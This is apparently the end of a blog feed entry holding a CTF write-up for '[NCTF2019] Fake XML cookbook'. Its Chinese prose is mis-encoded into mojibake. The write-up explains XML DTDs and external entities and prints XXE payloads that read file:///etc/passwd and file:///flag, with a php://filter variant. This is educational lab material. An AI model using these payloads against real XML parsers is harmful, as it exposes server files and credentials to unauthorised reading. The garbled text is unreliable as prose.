xmlæ–‡æ¡£å¿…é¡»æœ‰æ ¹å…ƒç´ <br>5. xmlçš„å±æ€§å€¼å¿…é¡»åŠ å¼•å·<br><br>xmlæ–‡æ¡£çš„æ³¨é‡Šï¼š<span class="hljs-comment">&lt;!-- --&gt;</span><br><br>DTD(æ–‡æ¡£ç±»å‹å®šä¹‰)ï¼šå¯å®šä¹‰åˆæ³•çš„xmlæ–‡æ¡£æ„å»ºæ¨¡å—ã€‚å®ƒä½¿ç”¨ä¸€ç³»åˆ—åˆæ³•çš„å…ƒç´ æ¥å®šä¹‰æ–‡æ¡£çš„ç»“æ„ã€‚DTDå¯è¢«æˆè¡Œçš„å£°æ˜äºXMLæ–‡æ¡£ä¸­ï¼Œä¹Ÿå¯ä»¥ä½œä¸ºä¸€ä¸ªå¤–éƒ¨å¼•ç”¨<br><br>DTDçš„ä¸‰ç§åº”ç”¨å½¢å¼ï¼š<br>1. å†…éƒ¨DTDæ–‡æ¡£  <span class="hljs-meta">&lt;!DOCTYPE æ ¹å…ƒç´ [å®šä¹‰å†…å®¹]&gt;</span><br>2. å¤–éƒ¨DTDæ–‡æ¡£  <span class="hljs-meta">&lt;!DOCTYPE æ ¹å…ƒç´  <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;DTDæ–‡ä»¶è·¯å¾„&quot;</span>&gt;</span><br>3. å†…å¤–DTDç»“åˆ  <span class="hljs-meta">&lt;!DOCTYPE æ ¹å…ƒç´  <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;DTDæ–‡ä»¶è·¯å¾„&quot;</span> [å®šä¹‰å†…å®¹]&gt;</span><br><br>DTDå®ä½“ï¼š<br>ç”¨äºå®šä¹‰å¼•ç”¨æ™®é€šæ–‡æœ¬æˆ–ç‰¹æ®Šçš„å¿«æ·æ–¹å¼å˜é‡ï¼›å®ä½“å¼•ç”¨æ˜¯å¯¹å®ä½“çš„ä»¥ç”¨ï¼›å®ä½“å¯åœ¨å†…éƒ¨æˆ–å¤–éƒ¨è¿›è¡Œå£°æ˜ã€‚<br>å®ä½“åˆ†ä¸ºï¼šä¸€èˆ¬å®ä½“å’Œå‚æ•°å®ä½“<br>ä¸€èˆ¬å®ä½“çš„å£°æ˜æ–¹æ³•ï¼š<span class="hljs-meta">&lt;!ENTITY å®ä½“åç§° <span class="hljs-meta-string">&quot;å®ä½“å†…å®¹&quot;</span>&gt;</span>  å¼•ç”¨ä¸€èˆ¬å®ä½“çš„æ–¹æ³•ï¼š&amp;å®ä½“åç§°<br>* ä¸€èˆ¬å®ä½“å¯ä»¥åœ¨DTDï¼Œxmlï¼Œå£°æ˜å‰ï¼Œå®ä½“å£°æ˜å†…éƒ¨å¼•ç”¨<br>å‚æ•°å®ä½“çš„å£°æ˜ï¼š<span class="hljs-meta">&lt;!ENTITY % å®ä½“åç§° <span class="hljs-meta-string">&quot;å®ä½“å†…å®¹&quot;</span>&gt;</span>  å¼•ç”¨å‚æ•°å®ä½“çš„æ–¹æ³•ï¼š%å®ä½“åç§°<br>* å‚æ•°å®ä½“åªèƒ½åœ¨DTDä¸­å¼•ç”¨<br>å†…éƒ¨å®ä½“ï¼š<span class="hljs-meta">&lt;!ENTITY å®ä½“åç§° <span class="hljs-meta-string">&quot;å®ä½“çš„å€¼&quot;</span> &gt;</span> <br>ä¾‹ï¼š<span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">foo</span> [<span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">foo</span> <span class="hljs-meta-keyword">ANY</span>&gt;</span></span><br><span class="hljs-meta">   <span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">xxe</span> <span class="hljs-meta-string">&quot;hello&quot;</span>&gt;</span>]&gt;</span> <br>   <span class="hljs-tag">&lt;<span class="hljs-name">foo</span>&gt;</span>&amp;xxe<span class="hljs-tag">&lt;/<span class="hljs-name">foo</span>&gt;</span><br>å¤–éƒ¨å®ä½“ï¼šç”¨æ¥å¼•å…¥å¤–éƒ¨èµ„æºï¼Œæœ‰SYSTEM å’Œ PUBLIC ä¸¤ä¸ªå…³é”®å­—ï¼Œè¡¨ç¤ºå®ä½“æ¥è‡ªæœ¬åœ°è®¡ç®—æœºè¿˜æ˜¯å…¬å…±è®¡ç®—æœº<br><span class="hljs-meta">&lt;!ENTITY å®ä½“åç§° <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;URL&quot;</span>&gt;</span><br><br>å¤–éƒ¨å®ä½“çš„å¼•ç”¨å¯ä»¥åˆ©ç”¨å¦‚ä¸‹åè®®ï¼š<br>file:///path/to/file.txt<br>http://url/file.txt<br>php://filter/read=convert.base64-encode/resource=flag.txt<br><br>å¤–éƒ¨å®ä½“å¯ä»¥æ”¯æŒhttp,file ç­‰åè®®ï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡å¼•ç”¨å¤–éƒ¨å®ä½“è¿›è¡Œè¿œç¨‹æ–‡ä»¶è¯»å–<br>ä¾‹ï¼š<span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">xdsec</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">methodname</span> <span class="hljs-meta-keyword">ANY</span> &gt;</span></span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">xxe</span>(å®ä½“å¼•ç”¨å) <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;file:///etc/passwd&quot;</span>(å®ä½“å†…å®¹) &gt;</span>]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">methodcall</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">methodname</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">methodname</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">methodcall</span>&gt;</span><br>è¿™é‡Œçš„xmlå¤–éƒ¨å®ä½“xxeè¢«èµ‹äºˆçš„å€¼ä¸ºfile:///etc/passwd å½“è§£æxmlæ–‡æ¡£æ—¶ï¼Œ&amp;xxeä¼šè¢«æ›¿æ¢ä¸ºfile:///ect/passwdçš„å†…å®¹ï¼Œå¯¼è‡´æ•æ„Ÿä¿¡æ¯æ³„éœ²<br></code></pre></td></tr></table></figure><h3 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h3><p>æ­¤é¢˜å°±æ˜¯ä¸€ä¸ªç®€å•çš„xxeæ”»å‡»</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="xml">payload:</span><br><span class="php"><span class="hljs-meta">&lt;?</span> xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span><span class="hljs-meta">?&gt;</span></span><br><span class="xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">xxe</span> [</span></span><br><span class="xml"><span class="hljs-meta">&lt;!ELENENT <span class="hljs-meta-keyword">name</span> <span class="hljs-meta-keyword">ANY</span> &gt;</span></span><br><span class="xml"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">person</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;file:///flag&quot;</span>&gt;</span></span><br><span class="xml">]&gt;</span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span><span class="hljs-symbol">&amp;person;</span><span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>123<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/01/01/SMizh13REwGK4NJ.png" alt="image-20210101221407136"></p><blockquote><p>flagçš„ä½ç½®æ˜¯çŒœå‡ºæ¥çš„</p></blockquote><p><strong>XXEæ¼æ´åæœŸå¯ä»¥ä¸“é—¨å­¦ä¹ ä¸€ä¸‹</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;NCTF2019-Fake-XML-cookbook&quot;&gt;&lt;a href=&quot;#NCTF2019-Fake-XML-cookbook&quot; class=&quot;headerlink&quot; title=&quot;[NCTF2019]Fake XML cookbook&quot;&gt;&lt;/a&gt;[NCTF20</summary>
      
    
    
    
    
    <category term="Web" scheme="http://example.com/tags/Web/"/>
    
    <category term="WriteUp" scheme="http://example.com/tags/WriteUp/"/>
    
  </entry>
  
</feed>
